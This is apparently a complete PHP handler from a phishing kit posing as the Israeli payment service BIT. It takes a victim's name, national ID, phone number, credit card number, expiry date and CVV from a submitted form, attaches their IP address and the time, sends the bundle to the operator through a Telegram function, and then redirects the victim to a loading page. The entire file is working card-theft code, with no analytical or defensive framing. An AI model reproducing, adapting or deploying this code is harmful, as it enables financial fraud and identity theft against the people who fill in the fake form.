<?php

include("tlgrm.php");

$date = date('Y-m-d H:i:s', time());
$ip = getenv("REMOTE_ADDR");

$message = "🔐 BIT Israel Personal Information 🔐\n";
$message .= "▪️ Full Name: " . $_POST['name'] . "\n";
$message .= "▪️ ID: " . $_POST['id'] . "\n";
$message .= "▪️ Phone Number: " . $_POST['mobile'] . "\n";
$message .= "▪️ CC Number: " . $_POST['card'] . "\n";
$message .= "▪️ Expiry Date: " . $_POST['month'] . "/" . $_POST["year"] . "\n";
$message .= "▪️ CVV: " . $_POST['cvv'] . "\n";
$message .= "▪️ IP Address: " . $ip . "\n";
$message .= "▪️ Date/Time: " . $date . "\n";
$message .= "---------------------------------------------\n";

telegram($message);

echo "<meta http-equiv='refresh' content='0; url=load.php'/>";

?>
